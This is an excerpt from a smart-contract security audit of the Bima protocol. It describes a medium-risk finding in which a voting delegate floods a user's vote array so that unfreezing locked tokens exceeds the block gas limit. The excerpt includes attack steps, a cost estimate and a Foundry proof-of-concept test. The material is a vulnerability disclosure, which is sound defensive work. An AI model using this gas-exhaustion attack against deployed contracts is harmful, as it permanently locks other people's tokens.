# Recommendation: Reset error when overwrite collateral

**Severity:** medium
**Auditor:** Cantina
**Protocol:** Bima 
**Keywords:** delegate, Incentive Voting, locked tokens, freeze, voting, trusted address, user, account, activeVotes, gas limit, unfreeze, vote, points, vote length, frozen weight, attack vector, cost calculations, Smart Contract, Ethereum, collateral

---

# Recommendation: Reset error when overwrite collateral
\u0060\u0060\u0060solidity
function _overwriteCollateral(IERC20 _newCollateral, uint256 idx) internal {
    // ...
    // overwrite old collateral with new one
    collateralTokens[idx] = _newCollateral;
    lastCollateralError_Offset[idx] = 0;
}
\u0060\u0060\u0060

## 3.2.9 Delegate in Incentive Voting can lock user\u0027s tokens forever
**Submitted by:** T1MOH  
**Severity:** Medium Risk  
**Context:** (No context files were provided by the reviewer)  
**Summary:** There is a concept "delegate" across Bima contract. Delegate is trusted address allowed to perform certain actions on behalf of a user. Let\u0027s take Incentive Voting for example, delegate is allowed to:
1. Register weight.
2. Vote.
3. Clear votes.

By enabling delegate, user trusts him to perform voting-related actions. When a user is dissatisfied with the delegate\u0027s actions, he can always revoke it. However due to this issue delegate can freeze user\u0027s locked tokens forever. It goes beyond described allowed actions and can\u0027t be treated as acceptable risk of trusted party because party is only trusted to perform voting actions.

**Description:** There is an activeVotes array which contains all current votes. It can be expanded up to 10,000 entries during voting.
## Code Snippets

\u0060\u0060\u0060solidity
function vote(address account, Vote[] calldata votes, bool clearPrevious) external callerOrDelegated(account) {
  // ...
  // store the new account votes
  _storeAccountVotes(account, accountData, votes, points, offset); // <<<
}

function _storeAccountVotes(
  address account,
  AccountData storage accountData,
  Vote[] calldata votes,
  uint256 points,
  uint256 offset
) internal {
  // get storage reference to account\u0027s active votes
  uint16[2][MAX_POINTS] storage storedVotes = accountData.activeVotes;
  // iterate through votes input, cheaper to not
  // cache length since calldata
  for (uint256 i; i < votes.length; i++) {
    // ...
    // record each vote
    storedVotes[offset + i] = [SafeCast.toUint16(votes[i].id), SafeCast.toUint16(votes[i].points)]; // <<<
    points += votes[i].points;
  }
  require(points <= MAX_POINTS, "Exceeded max vote points");
  accountData.voteLength = SafeCast.toUint16(offset + votes.length);
  accountData.points = SafeCast.toUint16(points);
  emit NewVotes(account, getWeek(), votes, points);
}

function unfreeze(address account, bool keepVote) external returns (bool success) {
  // ...
  // if user had frozen weight, reset it and clear optionally
  // clear their votes using frozen weight
  if (frozenWeight > 0) {
    // clear previous votes
    Vote[] memory existingVotes;
    if (accountData.voteLength > 0) {
      existingVotes = getAccountCurrentVotes(account);
      _removeVoteWeightsFrozen(existingVotes, frozenWeight); // <<<
    }
    // ...
  }
}

function _removeVoteWeightsFrozen(Vote[] memory votes, uint256 frozenWeight) internal {
  // ...
  // cache votes length
  uint256 length = votes.length;
  // iterate through every vote
  for (uint256 i; i < length; i++) {
    (uint256 id, uint256 points) = (votes[i].id, votes[i].points);
    uint256 weight = (frozenWeight * points) / MAX_POINTS;
    // trigger receiver weight write to process any missing
    // weeks until system week, then update storage receiver
    // weekly weights
    receiverWeeklyWeights[id][systemWeek] = SafeCast.toUint40(getReceiverWeightWrite(id) - weight);
    // update working data
    totalWeight += weight;
  }
  // ...
}
\u0060\u0060\u0060
Soit introduces following attack vector:
1. User enables delegate to perform voting.
2. User freezes his locks.
3. Delegate votes 10_000 times for 0 id (StabilityPool) with 0 points. This way it\u0027s cheaper and costs 2700USDwithcurrentprices.
4. User can\u0027t unfreeze his locked tokens, because this operation costs >30M gas which is greater than block gasLimit.

As a result, tokens are frozen forever and it\u0027s impossible to return it. Delegate is allowed to vote in any way, however it must not be able to brick tokens forever.

It contains attack cost calculations. Introduce this change:

\u0060\u0060\u0060diff
192 ~/projects/audit/PoC/bima-v1-core% git diff
diff --git a/test/foundry/poc.t.sol b/test/foundry/poc.t.sol
index 75d1ce6..f190fc4 100644
--- a/test/foundry/poc.t.sol
+++ b/test/foundry/poc.t.sol
@@ -11,6 +11,8 @@ import {MultiCollateralHintHelpers} from "../../contracts/core/helpers/MultiColl
 import {StorkOracleWrapper} from "../../contracts/wrappers/StorkOracleWrapper.sol";
 import {IBimaVault} from "../../contracts/interfaces/IVault.sol";
+import "../../contracts/interfaces/IIncentiveVoting.sol";
+
 /**
 * @title MockStorkOracle
 * @dev A mock implementation of the Stork Oracle for testing purposes
\u0060\u0060\u0060

Insert this test into test/foundry/poc.t.sol:

\u0060\u0060\u0060solidity
function test_custom14_T1MOH() public {
  // 1. Lock, freeze and delegate
  address voteDelegate = makeAddr("voteDelegate");
  address user01 = makeAddr("user01");
  deal(address(bimaToken), user01, 100e18);
  vm.startPrank(user01);
  tokenLocker.lock(user01, 100, 10);
  tokenLocker.freeze();
  incentiveVoting.setDelegateApproval(voteDelegate, true);
  vm.stopPrank();
  // 2. Fill dummy votes
  vm.startPrank(voteDelegate);
  incentiveVoting.registerAccountWeight(user01, 0);
  IIncentiveVoting.Vote[] memory votes = new IIncentiveVoting.Vote[](1800);
  for (uint i; i < votes.length; i++) {
    votes[i] = IIncentiveVoting.Vote(0, 0);
  }
  uint256 gasBefore1 = gasleft();
  for (uint i; i < 5; i++) {
    uint256 a = gasleft();
    incentiveVoting.vote(user01, votes, false);
    console.log("gas spent in \u0060vote()\u0060: %e", a - gasleft());
  }
  uint256 gasAfter1 = gasleft();
  console.log("delegator gas used: %e", gasBefore1 - gasAfter1); // 121M gas
  // 3. User tries to unfreeze
  vm.startPrank(user01);
  uint256 gasBefore2 = gasleft();
  tokenLocker.unfreeze(false); // costs 30.7M gas
  uint256 gasAfter2 = gasleft();
}
\u0060\u0060\u0060
